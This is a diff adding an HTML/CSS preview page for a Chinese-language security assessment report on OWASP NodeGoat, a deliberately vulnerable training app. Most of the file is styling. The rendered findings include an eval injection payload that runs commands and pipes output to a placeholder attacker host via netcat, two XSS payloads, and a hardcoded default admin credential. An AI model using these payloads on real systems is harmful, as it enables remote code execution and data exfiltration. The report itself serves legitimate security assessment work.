@@ -1,0 +1,288 @@
+<!doctype html>
+<html lang="zh-CN" data-theme="dark">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>报告页预览 C — 轻量排版调优</title>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Serif:wght@400;500;600;700&display=swap" rel="stylesheet" />
+<style>
+:root, [data-theme="dark"] {
+  --background: 213 33% 6%; --foreground: 213 22% 82%;
+  --card: 217 26% 11%; --muted: 217 26% 16%; --muted-fg: 213 12% 47%;
+  --border: 217 26% 20%; --border-strong: 217 26% 28%;
+  --primary: 189 94% 53%; --primary-fg: 213 33% 6%;
+  --c-cyan: 189 94% 53%; --c-magenta: 270 100% 80%;
+  --c-yellow: 40 94% 55%; --c-green: 137 55% 52%; --c-red: 0 92% 63%;
+  --font-mono: "IBM Plex Mono", ui-monospace, monospace;
+  --font-sans: "IBM Plex Sans", system-ui, sans-serif;
+  --font-serif: "IBM Plex Serif", Georgia, serif;
+  --radius: 3px;
+}
+[data-theme="light"] {
+  --background: 0 0% 100%; --foreground: 217 26% 16%;
+  --card: 0 0% 100%; --muted: 220 30% 96%; --muted-fg: 213 12% 47%;
+  --border: 213 25% 88%; --border-strong: 213 25% 78%;
+  --primary: 190 92% 36%; --primary-fg: 0 0% 100%;
+  --c-cyan: 190 92% 36%; --c-magenta: 262 83% 58%;
+  --c-yellow: 38 90% 40%; --c-green: 137 66% 32%; --c-red: 0 73% 51%;
+}
+* { box-sizing: border-box; }
+body { margin: 0; background: hsl(var(--background)); color: hsl(var(--foreground)); font-family: var(--font-sans); -webkit-font-smoothing: antialiased; }
+a { color: hsl(var(--primary)); }
+
+.topbar { position: sticky; top: 0; z-index: 50; height: 48px; display: flex; align-items: center; gap: 16px; padding: 0 20px; background: hsl(var(--background) / 0.85); backdrop-filter: blur(8px); border-bottom: 1px solid hsl(var(--border)); }
+.brand { display: flex; align-items: center; gap: 8px; font-weight: 700; }
+.brand-mark { width: 18px; height: 18px; background: hsl(var(--primary)); border-radius: 2px; position: relative; }
+.brand-mark::after { content:""; position:absolute; inset:4px; border:1.5px solid hsl(var(--primary-fg)); border-radius:1px; }
+.crumb { color: hsl(var(--muted-fg)); font-size: 12px; }
+.crumb b { color: hsl(var(--foreground)); font-weight: 500; }
+.topbar .spacer { flex: 1; }
+.theme-btn { font-family: var(--font-mono); font-size: 11px; color: hsl(var(--muted-fg)); background: hsl(var(--muted)); border: 1px solid hsl(var(--border)); padding: 5px 10px; border-radius: var(--radius); cursor: pointer; }
+
+/* ===== prose 容器：精装排版（只动 CSS，不加结构） ===== */
+.report {
+  max-width: 880px; margin: 0 auto; padding: 32px 28px 120px;
+  font-family: var(--font-sans); font-size: 14.5px; line-height: 1.75;
+}
+.report > *:first-child { margin-top: 0; }
+
+/* h1: serif 大字 + 主色底线（章节锚） */
+.report h1 {
+  font-family: var(--font-serif); font-size: 28px; font-weight: 700; line-height: 1.2;
+  letter-spacing: -0.015em; margin: 56px 0 20px; padding-bottom: 14px;
+  border-bottom: 2px solid hsl(var(--primary) / 0.5);
+  position: relative; scroll-margin-top: 72px;
+}
+.report h1::after {
+  content: ""; position: absolute; left: 0; bottom: -2px; width: 64px; height: 2px; background: hsl(var(--primary));
+}
+.report > h1:first-child { margin-top: 0; }
+
+/* h2: 带 mono 序号 eyebrow */
+.report h2 {
+  font-family: var(--font-serif); font-size: 20px; font-weight: 600; line-height: 1.3;
+  margin: 40px 0 14px; letter-spacing: -0.01em; scroll-margin-top: 72px;
+  display: flex; align-items: baseline; gap: 10px;
+}
+.report h2::before {
+  content: attr(data-eyebrow); font-family: var(--font-mono); font-size: 11px; font-weight: 500;
+  color: hsl(var(--muted-fg)); letter-spacing: 0.1em;
+  border: 1px solid hsl(var(--border)); padding: 2px 6px; border-radius: 2px;
+  position: relative; top: -2px;
+}
+
+/* h3: 漏洞条目标题 —— mono 化 + 左类型色点 */
+.report h3 {
+  font-family: var(--font-sans); font-size: 15px; font-weight: 600; line-height: 1.4;
+  margin: 24px 0 10px; padding-left: 14px; position: relative; scroll-margin-top: 72px;
+}
+.report h3::before {
+  content: ""; position: absolute; left: 0; top: 7px; width: 6px; height: 6px; border-radius: 1px;
+  background: hsl(var(--muted-fg));
+}
+.report h3[data-t="inj"]::before { background: hsl(var(--c-cyan)); }
+.report h3[data-t="xss"]::before { background: hsl(var(--c-magenta)); }
+.report h3[data-t="auth"]::before { background: hsl(var(--c-yellow)); }
+.report h3[data-t="authz"]::before { background: hsl(var(--c-green)); }
+.report h3[data-t="ssrf"]::before { background: hsl(var(--c-red)); }
+
+.report p { margin: 10px 0; }
+.report strong { color: hsl(var(--foreground)); font-weight: 600; }
+.report p code, .report li code {
+  font-family: var(--font-mono); font-size: 0.86em; background: hsl(var(--muted));
+  padding: 1px 5px; border-radius: 2px; color: hsl(var(--primary)); border: 1px solid hsl(var(--border));
+}
+
+/* 内联 vuln-id chip（在正文里也能跳） */
+.vid {
+  font-family: var(--font-mono); font-size: 0.82em; font-weight: 600; padding: 1px 6px;
+  border-radius: 2px; white-space: nowrap; text-decoration: none;
+}
+.vid[data-t="inj"] { color: hsl(var(--c-cyan)); background: hsl(var(--c-cyan) / 0.1); border: 1px solid hsl(var(--c-cyan) / 0.3); }
+.vid[data-t="xss"] { color: hsl(var(--c-magenta)); background: hsl(var(--c-magenta) / 0.1); border: 1px solid hsl(var(--c-magenta) / 0.3); }
+.vid[data-t="auth"] { color: hsl(var(--c-yellow)); background: hsl(var(--c-yellow) / 0.12); border: 1px solid hsl(var(--c-yellow) / 0.35); }
+.vid[data-t="authz"] { color: hsl(var(--c-green)); background: hsl(var(--c-green) / 0.1); border: 1px solid hsl(var(--c-green) / 0.3); }
+.vid[data-t="ssrf"] { color: hsl(var(--c-red)); background: hsl(var(--c-red) / 0.1); border: 1px solid hsl(var(--c-red) / 0.3); }
+.vid:hover { text-decoration: none; filter: brightness(1.15); }
+
+/* severity / 信号 文字色编码（零结构改动，只着色） */
+.sev-c { color: hsl(var(--c-red)); font-weight: 600; }
+.sev-h { color: hsl(var(--c-yellow)); font-weight: 600; }
+.sev-m { color: hsl(var(--c-cyan)); font-weight: 600; }
+.sig-pub { color: hsl(var(--c-cyan)); font-family: var(--font-mono); font-size: 0.86em; }
+.sig-pre { color: hsl(var(--c-red)); font-family: var(--font-mono); font-size: 0.86em; font-weight: 600; }
+
+/* 「最高风险发现」ol —— 大号 mono 序号 */
+.report ol.toprisks { list-style: none; counter-reset: top; padding: 0; margin: 14px 0; }
+.report ol.toprisks li {
+  counter-increment: top; display: grid; grid-template-columns: 44px 1fr; gap: 12px;
+  padding: 12px 0; border-bottom: 1px dashed hsl(var(--border));
+}
+.report ol.toprisks li::before {
+  content: counter(top, decimal-leading-zero);
+  font-family: var(--font-mono); font-size: 18px; font-weight: 600; color: hsl(var(--muted-fg));
+  line-height: 1.2;
+}
+.report ol.toprisks li:last-child { border-bottom: none; }
+
+/* 类型汇总：inline 色点 + 数字（不做卡片，只排版） */
+.typeline { display: flex; flex-wrap: wrap; gap: 14px 20px; margin: 12px 0; padding: 12px 14px; background: hsl(var(--card)); border: 1px solid hsl(var(--border)); border-left: 2px solid hsl(var(--primary)); border-radius: var(--radius); }
+.typeline__item { display: flex; align-items: baseline; gap: 6px; font-size: 13px; }
+.typeline__item i { width: 8px; height: 8px; border-radius: 1px; display: inline-block; }
+.typeline__item b { font-family: var(--font-serif); font-size: 18px; font-weight: 700; }
+.typeline__item[data-t="inj"] i, .typeline__item[data-t="inj"] b { color: hsl(var(--c-cyan)); } .typeline__item[data-t="inj"] i { background: hsl(var(--c-cyan)); }
+.typeline__item[data-t="xss"] i, .typeline__item[data-t="xss"] b { color: hsl(var(--c-magenta)); } .typeline__item[data-t="xss"] i { background: hsl(var(--c-magenta)); }
+.typeline__item[data-t="auth"] i, .typeline__item[data-t="auth"] b { color: hsl(var(--c-yellow)); } .typeline__item[data-t="auth"] i { background: hsl(var(--c-yellow)); }
+.typeline__item[data-t="authz"] i, .typeline__item[data-t="authz"] b { color: hsl(var(--c-green)); } .typeline__item[data-t="authz"] i { background: hsl(var(--c-green)); }
+.typeline__item[data-t="ssrf"] i, .typeline__item[data-t="ssrf"] b { color: hsl(var(--c-red)); } .typeline__item[data-t="ssrf"] i { background: hsl(var(--c-red)); }
+.typeline__item span { color: hsl(var(--muted-fg)); font-family: var(--font-mono); font-size: 11.5px; }
+
+/* KV 行（冒号守卫）—— definition list 风格 */
+.report ul.kv { list-style: none; padding: 0; margin: 10px 0; }
+.report ul.kv li { display: grid; grid-template-columns: 130px 1fr; gap: 8px 14px; padding: 4px 0; font-size: 13.5px; }
+.report ul.kv li::before { content: none; }
+.report ul.kv strong { font-family: var(--font-mono); font-size: 11px; font-weight: 500; color: hsl(var(--muted-fg)); text-transform: uppercase; letter-spacing: 0.04em; padding-top: 2px; }
+.report ul.kv strong::after { content: ":"; }
+
+/* 表格 */
+.report table { width: 100%; border-collapse: collapse; font-size: 13px; margin: 14px 0; border: 1px solid hsl(var(--border)); border-radius: var(--radius); overflow: hidden; }
+.report th { background: hsl(var(--muted)); font-family: var(--font-mono); font-size: 11px; text-transform: uppercase; letter-spacing: 0.06em; color: hsl(var(--muted-fg)); text-align: left; padding: 8px 12px; border-bottom: 1px solid hsl(var(--border)); }
+.report td { padding: 9px 12px; border-bottom: 1px solid hsl(var(--border)); vertical-align: top; }
+.report tr:last-child td { border-bottom: none; }
+.report tr:nth-child(even) td { background: hsl(var(--muted) / 0.25); }
+.report td code { font-size: 11.5px; }
+
+/* 代码块：取证感（terminal 标题栏 + 左色线） */
+.report pre {
+  margin: 14px 0; background: hsl(var(--background)); border: 1px solid hsl(var(--border-strong));
+  border-radius: var(--radius); overflow: hidden; position: relative;
+}
+.report pre::before {
+  content: "▌ witness / PoC"; display: block; font-family: var(--font-mono); font-size: 10.5px;
+  color: hsl(var(--muted-fg)); background: hsl(var(--muted)); padding: 5px 12px;
+  border-bottom: 1px solid hsl(var(--border)); letter-spacing: 0.06em; text-transform: uppercase;
+}
+.report pre code { display: block; background: none; border: none; padding: 12px 14px; font-size: 12.5px; line-height: 1.6; color: hsl(var(--c-green)); overflow-x: auto; }
+.tok-k { color: hsl(var(--c-cyan)); } .tok-s { color: hsl(var(--c-green)); } .tok-n { color: hsl(var(--c-magenta)); } .tok-c { color: hsl(var(--muted-fg)); font-style: italic; }
+
+/* 章节分隔：类型色梯度线 */
+.divider { height: 1px; margin: 40px 0; background: linear-gradient(90deg, hsl(var(--c-cyan)) 0%, hsl(var(--c-magenta)) 25%, hsl(var(--c-yellow)) 50%, hsl(var(--c-green)) 75%, hsl(var(--c-red)) 100%); opacity: 0.4; }
+
+.report .lead { font-size: 15px; color: hsl(var(--foreground) / 0.9); }
+.report hr { border: none; border-top: 1px solid hsl(var(--border)); margin: 32px 0; }
+
+@media (max-width: 720px) {
+  .report ol.toprisks li, .report ul.kv li { grid-template-columns: 1fr; }
+  .report ul.kv strong { padding-top: 0; }
+}
+</style>
+</head>
+<body>
+<header class="topbar">
+  <span class="brand"><span class="brand-mark"></span>SHANNON</span>
+  <span class="crumb">workspaces / <b>NodeGoat_20260630-002707</b> / 报告</span>
+  <span class="spacer"></span>
+  <button class="theme-btn" onclick="toggleTheme()">◐ theme: dark</button>
+</header>
+
+<article class="report">
+
+  <h1>安全评估报告</h1>
+  <p class="lead">本次评估对 <strong>OWASP NodeGoat v1.3.0</strong> 的全部网络可达攻击面完成系统性白盒审计，共确认 <strong>36 个漏洞</strong>（injection 4、xss 13、auth 10、authz 7、ssrf 2），覆盖 OWASP Top 10 中的注入、跨站脚本、失效的认证、失效的访问控制与 SSRF 五大类。</p>
+
+  <div class="typeline">
+    <div class="typeline__item" data-t="inj"><i></i><b>4</b><span>Inj · C~H</span></div>
+    <div class="typeline__item" data-t="xss"><i></i><b>13</b><span>XSS · H~L</span></div>
+    <div class="typeline__item" data-t="auth"><i></i><b>10</b><span>Auth · 8H/2M</span></div>
+    <div class="typeline__item" data-t="authz"><i></i><b>7</b><span>Authz · High</span></div>
+    <div class="typeline__item" data-t="ssrf"><i></i><b>2</b><span>SSRF · C~H</span></div>
+  </div>
+
+  <p><strong>根因概述：</strong>该应用把几乎所有防御控制（<code>helmet</code>、<code>csurf</code>、<code>bcrypt-nodejs</code>、HTTPS、cookie 标志、Swig <code>autoescape</code>）都以注释掉的 <code>// Fix for A?</code> 代码块形式保留——依赖已声明但未启用。部署形态下几乎不携带任何运行时防御。</p>
+
+  <h2 data-eyebrow="01">执行摘要 · 最高风险发现</h2>
+  <ol class="toprisks">
+    <li><span><a class="vid" data-t="inj" href="#inj-01">INJ-VULN-01/02/03</a> <strong>服务端 RCE</strong>：<code>POST /contributions</code> 的 <code>preTax/afterTax/roth</code> 直达 <code>eval()</code>，可执行系统命令；仅需任一登录态。<span class="sig-pre">pre-auth 可达</span></span></li>
+    <li><span><a class="vid" data-t="ssrf" href="#ssrf-01">SSRF-VULN-01</a> <strong>完整响应 SSRF</strong>：<code>GET /research</code> 将 <code>req.query.url</code> 拼接后出站并回写完整响应体，可命中 AWS IMDS / loopback / 内网。<span class="sig-pub">公网</span></span></li>
+    <li><span><a class="vid" data-t="auth" href="#auth-08">AUTH-VULN-08</a> <strong>管理员账户接管</strong>：硬编码默认凭据 <code>admin/Admin_123</code> 每次容器启动重灌。</span></li>
+    <li><span><a class="vid" data-t="xss" href="#xss-04">XSS-VULN-04</a> <strong>经公开注册对 admin 的存储型 XSS</strong>：admin 查看 <code>/benefits</code> 即触发；叠加 <code>csurf</code> 全局禁用，可链 XSS→CSRF。</span></li>
+    <li><span><a class="vid" data-t="authz">AUTHZ-VULN-01/03/06</a> <strong>横向/纵向越权</strong>：<code>/allocations/:userId</code> 与 <code>POST /benefits</code> 的 <code>userId</code> 取自 params/body 而非 session。</span></li>
+  </ol>
+
+  <h2 data-eyebrow="02">按漏洞类型汇总</h2>
+  <h3 data-t="inj">Injection · <span class="sev-c">Critical</span> ~ <span class="sev-h">High</span> · 4</h3>
+  <p>3 条 SSJS/命令注入（RCE）—— <code>POST /contributions</code> 的 <code>preTax/afterTax/roth</code> 各自直达独立的 <code>eval()</code>；1 条 NoSQL <code>$where</code> 注入。全部仅需 <code>isLoggedIn</code>，置信度 high。</p>
+  <h3 data-t="xss">XSS · <span class="sev-h">High</span> ~ <span class="sev-m">Medium</span> · 13</h3>
+  <p>3 个 pre-auth 反射型 XSS（<code>/login</code>、<code>/signup</code> 属性回显）；多个存储型，首要为经公开注册对 admin 投毒。全局根因为 Swig <code>autoescape:false</code>。</p>
+  <h3 data-t="auth">Auth · <span class="sev-h">High</span> ~ <span class="sev-m">Medium</span> · 10 (8H/2M)</h3>
+  <p>会话生命周期失控 + 凭据策略全面失守 + 缺失 abuse 防御。其中 8 条 High、2 条 Medium。</p>
+
+  <div class="divider"></div>
+
+  <h1>注入分析报告</h1>
+  <h2 data-eyebrow="Q">Exploitation Queue</h2>
+  <table>
+    <thead><tr><th>ID</th><th>类型</th><th>源</th><th>Sink</th><th>认证</th><th>置信</th></tr></thead>
+    <tbody>
+      <tr><td><a class="vid" data-t="inj" href="#inj-01">INJ-VULN-01</a></td><td>CommandInjection (SSJS/RCE)</td><td><code>preTax</code> @ :32</td><td><code>eval()</code></td><td>isLoggedIn</td><td><span class="sev-h">high</span></td></tr>
+      <tr><td><a class="vid" data-t="inj">INJ-VULN-02</a></td><td>CommandInjection (SSJS/RCE)</td><td><code>afterTax</code> @ :33</td><td><code>eval()</code></td><td>isLoggedIn</td><td><span class="sev-h">high</span></td></tr>
+      <tr><td><a class="vid" data-t="inj">INJ-VULN-04</a></td><td>SQLi (NoSQL $where)</td><td><code>threshold</code> @ :78</td><td><code>$where</code></td><td>isLoggedIn</td><td><span class="sev-h">high</span></td></tr>
+    </tbody>
+  </table>
+
+  <h3 data-t="inj" id="inj-01"><a class="vid" data-t="inj">INJ-VULN-01</a> — SSJS 命令注入 <span class="sig-pre">★ 首要目标</span></h3>
+  <ul class="kv">
+    <li><strong>vulnerability_type</strong>CommandInjection (SSJS/RCE)</li>
+    <li><strong>externally_exploitable</strong><span class="sig-pub">true</span> · 公网可达</li>
+    <li><strong>authentication_required</strong>isLoggedIn</li>
+    <li><strong>source</strong><code>POST /contributions</code> body <code>preTax</code>（contributions.js:32）</li>
+    <li><strong>sink_function</strong><code>eval()</code> —— 计算 contributions，零净化</li>
+    <li><strong>path</strong><code>req.body.preTax</code> → <code>eval()</code>（:32）→ SSJS 执行</li>
+    <li><strong>encoding_observed</strong>None</li>
+    <li><strong>verdict</strong>vulnerable · confidence <span class="sev-h">high</span></li>
+  </ul>
+  <pre><code>"require('child_process').exec('id | nc attacker 4444')"</code></pre>
+
+  <div class="divider"></div>
+
+  <h1>XSS 分析报告</h1>
+  <h2 data-eyebrow="Q">Exploitation Queue · 13 findings</h2>
+
+  <h3 data-t="xss" id="xss-04"><a class="vid" data-t="xss">XSS-VULN-04</a> — Stored XSS <span class="sig-pre">★ 首要目标</span></h3>
+  <ul class="kv">
+    <li><strong>vulnerability_type</strong>Stored</li>
+    <li><strong>externally_exploitable</strong><span class="sig-pub">true</span>（注入公开；渲染需登录，admin 登录即触发）</li>
+    <li><strong>authentication_required</strong>false（注入路由 <code>POST /signup</code> 公开）</li>
+    <li><strong>source</strong><code>POST /signup</code> body <code>firstName/lastName</code></li>
+    <li><strong>sink_function</strong>Swig <code>{{user.firstName}}</code>（benefits.html:51，admin 视图）</li>
+    <li><strong>render_context</strong>HTML_BODY</li>
+    <li><strong>encoding_observed</strong>None（autoescape:false）</li>
+    <li><strong>chain</strong>XSS→CSRF：admin 视图同源 fetch 触发 <code>/benefits</code> IDOR 或 <code>/contributions</code> RCE</li>
+  </ul>
+  <pre><code>&lt;img src=x onerror=alert(1)&gt;</code></pre>
+
+  <h3 data-t="xss" id="xss-01"><a class="vid" data-t="xss">XSS-VULN-01</a> — Reflected XSS <span class="sig-pre">★ 首破点</span></h3>
+  <ul class="kv">
+    <li><strong>vulnerability_type</strong>Reflected</li>
+    <li><strong>externally_exploitable</strong><span class="sig-pub">true</span> · <strong>authentication_required</strong>false（<code>POST /login</code> 无中间件）</li>
+    <li><strong>source</strong><code>POST /login</code> body <code>userName</code></li>
+    <li><strong>sink_function</strong>Swig <code>{{userName}}</code>（<code>&lt;input value=""&gt;</code>）</li>
+    <li><strong>render_context</strong>HTML_ATTRIBUTE · 引号突围</li>
+    <li><strong>encoding_observed</strong>None（autoescape:false）</li>
+  </ul>
+  <pre><code>" autofocus onfocus="alert(document.domain)</code></pre>
+
+</article>
+
+<script>
+function toggleTheme() {
+  const html = document.documentElement;
+  const next = html.dataset.theme === "dark" ? "light" : "dark";
+  html.dataset.theme = next;
+  document.querySelector(".theme-btn").textContent = "◐ theme: " + next;
+}
+</script>
+</body>
+</html>
